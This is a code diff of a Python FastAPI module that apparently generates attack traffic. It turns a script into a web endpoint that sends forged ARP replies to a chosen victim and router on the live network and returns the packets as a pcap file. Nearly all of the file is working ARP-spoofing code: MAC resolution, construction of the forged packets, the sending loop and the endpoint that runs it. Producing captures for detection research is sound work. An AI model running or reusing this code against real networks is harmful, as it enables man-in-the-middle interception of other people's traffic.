@@ -1,66 +1,147 @@
 import subprocess
 import sys
-import socket
-from datetime import datetime
-from contextlib import closing
+import os
+import re
+import tempfile
 import scapy.all as scapy
 
-iface = r"\Device\NPF_{4C19F751-9A06-4B55-B1EA-C49F268FC666}"
+from fastapi import FastAPI, UploadFile, File, HTTPException, Query, APIRouter, Request, Form
+from fastapi.responses import FileResponse, HTMLResponse
+from fastapi.templating import Jinja2Templates
 
-# fuction to get MAC of the victim
-def get_MAC(ip_ataque: str):
-    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip_ataque)
-    ans = scapy.srp(pkt, iface=iface, timeout=3, verbose=False)[0]
-    if ans:
-        return ans[0][1].hwsrc
-    # fallback: leer tabla arp
-    out = subprocess.check_output(["arp", "-a"], text=True, encoding="utf-8")
-    for line in out.splitlines():
-        if ip_ataque in line:
-            parts = line.split()
-            for p in parts:
-                if "-" in p and len(p.split("-")) == 6:
-                    return p.replace("-", ":").lower()
+router = APIRouter()
+templates = Jinja2Templates(directory="app/templates")
+
+# Cambia esto por tu interfaz adecuada (la que tiene tu IP LAN)
+
+def detect_physical_iface():
+    """
+    Devuelve automáticamente la interfaz Npcap
+    que tenga dirección IP en una red privada.
+    Funciona para cualquier IP y cualquier interfaz física.
+    """
+    private_prefixes = ("192.168.", "10.", "172.")
+
+    for iface in scapy.get_if_list():
+        try:
+            ip = scapy.get_if_addr(iface)
+            if ip.startswith(private_prefixes):
+                return iface
+        except:
+            pass
     return None
 
-# fuction to generate de ARP spoofing
-def arp_Spoof(ip_atacante: str, ip_victima: str, paquetes: list):
-    packet = scapy.ARP(op = 2, pdst = ip_atacante, hwdst = get_MAC(ip_victima), psrc = ip_victima)
-    scapy.send(packet, verbose=False)
-    paquetes.append(packet)
-    
-def generate_pcap(ip_maquina: str, ip_victima: str, ip_router: str):
-    paquetes = []
-    tam = 0
-    # cambiar esta parte de aqui para que se salga al hacer control+C y que se genere el pcap.
-    while tam < 50:
-            arp_Spoof(ip_victima=ip_victima, ip_atacante=ip_router, paquetes=paquetes)
-            arp_Spoof(ip_victima=ip_router, ip_atacante=ip_victima, paquetes=paquetes)
-            sys.stdout.flush()
-            tam += 1
-    
-    if not paquetes:
-        print("[!] No se ha generado ningun paquete")
-        sys.exit(1)
-    
-    salida = 'arp_spoofing.pcap'
-    scapy.wrpcap(salida, paquetes)
-    print("f[✔] pcap de ataque guardado en: {salida} (paquetes: {len(paquetes)})")
-    
+# ------------------------------------------------------------
+# Obtener MAC usando ARP request + fallback a tabla ARP Windows
+# ------------------------------------------------------------
+def get_mac(ip, iface):
+    print(f"[*] Resolviendo MAC de {ip} ...")
 
-def main():
-    if(len(sys.argv) != 3):
-        print("[!] No has pasado la IP de la maquina y/o router a la que se le hace un apr spoofing\n")
-        print("Nombre de archivo <ip_victima> <ip_router>")
-        sys.exit(1)
-    
-    Ip_ataque = sys.argv[1] # obtencion de la ip en formato string
-    router = sys.argv[2] # obtencion de la ip de la maquina
-    # obtencion de mi ip para hacer una somulacion y obtener un man in the middle.
-    hostname = socket.gethostname()
-    ip_host = socket.gethostbyname(hostname)
-    generate_pcap(ip_host, Ip_ataque, router)
+    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
+    ans = scapy.srp(pkt, iface=iface, timeout=2, verbose=False)[0]
+
+    if ans:
+        mac = ans[0][1].hwsrc
+        return mac
+
+    output = subprocess.check_output("arp -a", text=True)
+    for line in output.splitlines():
+        if ip in line:
+            mac = line.split()[1].replace("-", ":")
+            return mac
+
+    # print(f"[!] No se pudo obtener la MAC de {ip}")
+    return None
 
 
-if __name__ == "__main__":
-    main()
+# ------------------------------------------------------------
+# ARP Spoof Correcto (Ethernet + ARP)
+# ------------------------------------------------------------
+def build_spoof_packets(victim_ip, victim_mac, router_ip, router_mac):
+    # Paquete que engaña a la víctima fingiendo ser el router
+    pkt_to_victim = scapy.Ether(dst=victim_mac) / scapy.ARP(
+        op=2,
+        psrc=router_ip,
+        pdst=victim_ip,
+        hwdst=victim_mac
+    )
+
+    # Paquete que engaña al router fingiendo ser la víctima
+    pkt_to_router = scapy.Ether(dst=router_mac) / scapy.ARP(
+        op=2,
+        psrc=victim_ip,
+        pdst=router_ip,
+        hwdst=router_mac
+    )
+
+    return pkt_to_victim, pkt_to_router
+
+
+# ------------------------------------------------------------
+# Generación de PCAP y envío continuo hasta Ctrl+C
+# ------------------------------------------------------------
+def generate_pcap(victim_ip, router_ip, iface):
+    victim_mac = get_mac(victim_ip, iface)
+    router_mac = get_mac(router_ip, iface)
+
+    if not victim_mac or not router_mac:
+        raise RuntimeError("No se pudieron obtener todas las MAC.")
+
+    print("[*] Iniciando ataque ARP... Ctrl+C para detener.")
+
+    packets = []
+    i = 0
+    while i < 50:
+        pkt_v, pkt_r = build_spoof_packets(victim_ip, victim_mac, router_ip, router_mac)
+
+        scapy.sendp(pkt_v, iface=iface, verbose=False)
+        scapy.sendp(pkt_r, iface=iface, verbose=False)
+
+        packets.append(pkt_v)
+        packets.append(pkt_r)
+        i += 1
+    
+    return packets
+
+
+# ----------------------------------------
+#  Endpoints FastAPI
+# ----------------------------------------
+
+@router.get("/op_arp", response_class=HTMLResponse, tags=["op_arp"])
+async def cargar_pagina_portscan(request: Request):
+        return templates.TemplateResponse("arp.html", {"request": request})
+    
+
+@router.post("/op_arp", response_class=FileResponse, tags=["op_arp"])
+async def mutar_pcap(
+    ip_victima: str = Form(None, description="IP victima"),
+    ip_router: str = Form(None, description="IP router")
+):
+    """Recibe un pcap, genera un nuevo pcap 'de ataque' y lo devuelve."""
+    
+    # Crear archivo de salida temporal
+    out_fd, out_path = tempfile.mkstemp(suffix=".pcap")
+    os.close(out_fd)
+    
+    iface = detect_physical_iface()
+    if iface is None:
+        raise HTTPException(status_code=500, detail="No se detectó una interfaz de red válida.")
+    try:
+        paquetes = generate_pcap(ip_victima, ip_router, iface)
+        
+        if not paquetes:
+                raise HTTPException(status_code=400, detail="No se generaron paquetes.")
+            
+        # Guardar PCAP en el archivo temporal
+        scapy.wrpcap(out_path, paquetes)
+        
+        # Devolvemos el archivo generado
+        return FileResponse(
+            out_path,
+            media_type="application/vnd.tcpdump.pcap",
+            filename=f"arp_spoofing.pcap",
+        )
+    except RuntimeError as e:
+        # errores de nuestra lógica
+        raise HTTPException(status_code=500, detail=str(e))
